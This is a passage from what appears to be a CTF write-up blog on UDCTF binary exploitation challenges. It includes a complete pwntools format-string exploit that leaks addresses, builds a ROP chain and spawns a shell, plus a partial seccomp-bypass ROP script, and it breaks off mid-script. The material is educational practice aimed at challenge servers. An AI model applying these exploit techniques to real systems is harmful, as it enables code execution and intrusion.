+</span></span><span style=display:flex><span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>payload <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;flag:&#34;</span>)
+</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>flag <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#34;</span>)
+</span></span></code></pre></div><h3 id=the-flag-4>The Flag</h3><p><code>UDCTF{0bl1g4t0ry_buff3r_ov3rflow}</code></p><h3 id=conclusion-4>Conclusion</h3><p>This challenge neatly demonstrates a simple buffer overflow, with an overwriting of a local variable and passing parameters to a function to get our flag.</p><h2 id=formatt-zelinsky-461-points>ForMatt Zelinsky (461 points)</h2><h3 id=description-6>Description</h3><p>Right? What? Wear? Pants? Built on Ubuntu 20.04.</p><h3 id=gathering-information-6>Gathering information</h3><p>We can decompile the program with Ghidra. It extracts the following pseudo-c-code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(EVP_PKEY_CTX <span style=color:#f92672>*</span>param_1)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> buffer [<span style=color:#ae81ff>336</span>];
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  init(param_1);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Oh no!! Full RELRO, PIE enabled, and no obvious buffer overflow.:(&#34;</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Thankfully, I</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>m generous and will grant you two leaks&#34;</span>);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;This stack leak might be useful %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,buffer);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;And this PIE leak might be useful %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,main);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Now gimme your payload&#34;</span>);
+</span></span><span style=display:flex><span>  fgets(buffer,<span style=color:#ae81ff>0x150</span>,stdin);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Is this what you meant? &#34;</span>);
+</span></span><span style=display:flex><span>  printf(buffer);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>As 0x150 = 336, there is no buffer overflow. But there is indeed a format string vulnerability (<a href="https://www.youtube.com/watch?v=CyazDp-Kkr0">if you have no idea what this is, check this link</a>) as the program uses <code>printf</code> on our input buffer without any check.</p><h3 id=exploitation-6>Exploitation</h3><p>The idea is the following: we can use the format string vulnerability to write and execute a ropchain. Having this in mind, it&rsquo;s relatively simple to exploit the vulnerability.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;challenges.ctfd.io&#34;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>30042</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./formatz&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
+</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;/usr/lib/libc-2.33.so&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path])
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./libc6_2.31-0ubuntu9.2_amd64.so&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> remote(HOST, PORT), libc
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exec_fmt</span>(payload):
+</span></span><span style=display:flex><span>    p <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> p<span style=color:#f92672>.</span>recvall()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># good luck pwning :)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Determine format string offset automatically (thx pwntools &lt;3)</span>
+</span></span><span style=display:flex><span>    autofmt <span style=color:#f92672>=</span> FmtStr(exec_fmt)
+</span></span><span style=display:flex><span>    offset <span style=color:#f92672>=</span> autofmt<span style=color:#f92672>.</span>offset
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Format string offset: </span><span style=color:#e6db74>{</span>offset<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    io, libc <span style=color:#f92672>=</span> conn()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    buff_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x150</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># --------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ------------------- leaking libc ------------------ #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># --------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Recieve the leaks</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;This stack leak might be useful &#39;</span>)
+</span></span><span style=display:flex><span>    stack_leak <span style=color:#f92672>=</span> int(io<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;stack @ </span><span style=color:#e6db74>{</span>hex(stack_leak)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;And this PIE leak might be useful &#39;</span>)
+</span></span><span style=display:flex><span>    main_leak <span style=color:#f92672>=</span> int(io<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    exe<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> main_leak <span style=color:#f92672>-</span> exe<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;main&#39;</span>]
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;base address @ </span><span style=color:#e6db74>{</span>hex(exe<span style=color:#f92672>.</span>address)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># The offset to RIP is calculated as following</span>
+</span></span><span style=display:flex><span>    rip <span style=color:#f92672>=</span> stack_leak <span style=color:#f92672>+</span> buff_len <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span> <span style=color:#75715e># 8 = RBP length!</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># We make use of this useful gadget</span>
+</span></span><span style=display:flex><span>    pop_rdi <span style=color:#f92672>=</span> exe<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x00000000000012bb</span> <span style=color:#75715e># pop rdi; ret;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># We now use the format string vulnerability to write and execute a ropchain</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Overwrite EIP with whatever we want and use it to leak LIBC.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># In order to leak libc we execute puts with a function&#39;s GOT entry address as an argument.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># This way puts will print out, as a string, the address of the function inside libc.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Notice that, after leaking LIBC base address, we return to main.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># This is done to make it simple to execute another ropchain from a clear environment!</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Note: we use the function provided by pwntools because:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#    - I&#39;m lazy</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#    - It would be a hell of calculations to do this by hand</span>
+</span></span><span style=display:flex><span>    leak_func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;setvbuf&#39;</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> fmtstr_payload(offset, {rip: pop_rdi, rip<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>: exe<span style=color:#f92672>.</span>got[leak_func], rip<span style=color:#f92672>+</span><span style=color:#ae81ff>16</span>: exe<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>], rip<span style=color:#f92672>+</span><span style=color:#ae81ff>24</span>: exe<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;main&#39;</span>]}, write_size<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;short&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send payload...</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ...and recieve the leak</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    libc_leak <span style=color:#f92672>=</span> u64(io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>leak_func<span style=color:#e6db74>}</span><span style=color:#e6db74> @ </span><span style=color:#e6db74>{</span>hex(libc_leak)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Set the base address of libc, based on the leak</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Notice that the correct libc version was determined by leaking different functions</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># and using the online libc database https://libc.blukat.me/</span>
+</span></span><span style=display:flex><span>    libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_leak <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[leak_func]
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc base @ </span><span style=color:#e6db74>{</span>hex(libc<span style=color:#f92672>.</span>address)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># --------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------- execve(&#39;/bin/sh&#39;) ---------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># --------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Same as above, get leaks</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;This stack leak might be useful &#39;</span>)
+</span></span><span style=display:flex><span>    stack_leak <span style=color:#f92672>=</span> int(io<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;stack @ </span><span style=color:#e6db74>{</span>hex(stack_leak)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;And this PIE leak might be useful &#39;</span>)
+</span></span><span style=display:flex><span>    main_leak <span style=color:#f92672>=</span> int(io<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    exe<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> main_leak <span style=color:#f92672>-</span> exe<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;main&#39;</span>]
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;base address @ </span><span style=color:#e6db74>{</span>hex(exe<span style=color:#f92672>.</span>address)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Re-calculate rip address</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># The gadget positions stays the same (and we don&#39;t need it anyway)</span>
+</span></span><span style=display:flex><span>    rip <span style=color:#f92672>=</span> stack_leak <span style=color:#f92672>+</span> buff_len <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span> 
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Overwrite EIP with a onegadget that executes execve(&#39;/bin/sh&#39;, NULL, NULL) under some constraint.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># A onegadget is basically a sequence of instructions in a certain libc that makes the execve(&#39;/bin/sh&#39;, NULL, NULL) syscall.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># I don&#39;t usually check if the given constraints are respected, I just try them.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># $ onegadget libc6_2.31-0ubuntu9.2_amd64.so</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 0xe6c7e execve(&#34;/bin/sh&#34;, r15, r12)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># constraints:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [r15] == NULL || r15 == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [r12] == NULL || r12 == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 0xe6c81 execve(&#34;/bin/sh&#34;, r15, rdx)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># constraints:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [r15] == NULL || r15 == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [rdx] == NULL || rdx == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 0xe6c84 execve(&#34;/bin/sh&#34;, rsi, rdx)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># constraints:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [rsi] == NULL || rsi == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [rdx] == NULL || rdx == NULL</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send the payload</span>
+</span></span><span style=display:flex><span>    onegadget <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xe6c81</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> fmtstr_payload(offset, {rip: onegadget})
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Profit</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>interactive()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><p>Notice that this exploit sometimes fails to execute for unknown reasons.</p><h3 id=the-flag-5>The Flag</h3><p>We can then <code>cat flag.txt</code> and get the flag: <code>UDCTF{write-what-wear-pantz-660714392699745151725739719383302481806841115893230100153376}</code></p><h3 id=conclusions>Conclusions</h3><p>I usually dislike format string vulnerabilities. They are tedious and, let me say this, dumb. Even the compiler knows that you are doing something wrong and gives you a warning if you attempt to compile something with a format string vulnerability in it.</p><p>Nonetheless, I enjoyed this challenge a lot. Executing a ropchain via format string was very funny and a good learning experience.</p><h2 id=sandboxed-rop-445-points>Sandboxed ROP (445 points)</h2><h3 id=description-7>Description</h3><p>Chain of Fools Chain, keep us together. Running in the shadow.
+Flag is in /pwn/flag.txt</p><p>nc challenges.ctfd.io 30018</p><p>running on ubuntu 20.04</p><h3 id=gathering-information-7>Gathering information</h3><p>We can decompile the binary using Ghidra.
+The main function looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>undefined8 <span style=color:#a6e22e>main</span>(EVP_PKEY_CTX <span style=color:#f92672>*</span>param_1)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  undefined buffer [<span style=color:#ae81ff>16</span>];
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  init(param_1);
+</span></span><span style=display:flex><span>  init_seccomp();
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;pwn dis shit&#34;</span>);
+</span></span><span style=display:flex><span>  read(<span style=color:#ae81ff>0</span>,buffer,<span style=color:#ae81ff>0x200</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>We can already notice the buffer overflow. This time, though, there&rsquo;s a catch.</p><p>The <code>init_seccomp()</code> function has included some seccomp rules. These are basically rules that are placed in the program to make it behave in some secure way. Check the manual for more informations.</p><p>The decompiled function looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>init_seccomp</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  undefined8 seccomp_filter;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  seccomp_filter <span style=color:#f92672>=</span> seccomp_init(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  seccomp_rule_add(seccomp_filter,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  seccomp_rule_add(seccomp_filter,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  seccomp_rule_add(seccomp_filter,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  seccomp_rule_add(seccomp_filter,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>0xe7</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  seccomp_rule_add(seccomp_filter,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>0x101</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  seccomp_load(seccomp_filter);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>This function is initializing and loading a seccomp filter that basically forbids every syscall but the read, write, open, exit_group and openat ones.</p><p>Hence, we need to develop an exploit using these syscall only.</p><h3 id=exploitation-7>Exploitation</h3><p>The main idea of the exploit is to:</p><ul><li>Leak libc in order to be able to call <code>open</code> (we are missing a sycall instruction!)</li><li>Write <code>/pwn/flag.txt</code> to memory and call <code>open</code> with it</li><li>Read from the opened file descriptor, then output what we&rsquo;ve read</li></ul><p>We&rsquo;ve developed a small POC before trying to exploit this, in order to make sure that the idea would have worker:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;seccomp.h&gt;       </span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/stat.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    scmp_filter_ctx uVar1 <span style=color:#f92672>=</span> seccomp_init(<span style=color:#ae81ff>0</span>), uVar2;
+</span></span><span style=display:flex><span>    seccomp_rule_add(uVar1,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    seccomp_rule_add(uVar1,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    seccomp_rule_add(uVar1,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    seccomp_rule_add(uVar1,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>0xe7</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    seccomp_rule_add(uVar1,<span style=color:#ae81ff>0x7fff0000</span>,<span style=color:#ae81ff>0x101</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    seccomp_load(uVar1);
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;./flag.txt&#34;</span>,O_RDONLY);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>){
+</span></span><span style=display:flex><span>        write(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Did you create the flag.txt file?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>34</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> buff[<span style=color:#ae81ff>20</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
+</span></span><span style=display:flex><span>    read(fd, buff, <span style=color:#ae81ff>20</span>);
+</span></span><span style=display:flex><span>    write(<span style=color:#ae81ff>1</span>, buff, <span style=color:#ae81ff>20</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Compiling it with gcc (the <code>-lseccomp</code> flag was needed) and executing printed out our fake flag, so we were good to go!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;challenges.ctfd.io&#39;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>30018</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./chal.out&#39;</span>)
+</span></span><span style=display:flex><span>rop <span style=color:#f92672>=</span> ROP(exe)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
+</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;/usr/lib/libc-2.33.so&#39;</span>, checksec <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path]), libc, <span style=color:#e6db74>&#39;./flag.txt&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./libc6_2.31-0ubuntu9.1_amd64.so&#39;</span>, checksec <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> remote(HOST, PORT), libc, <span style=color:#e6db74>&#39;/pwn/flag.txt&#39;</span>
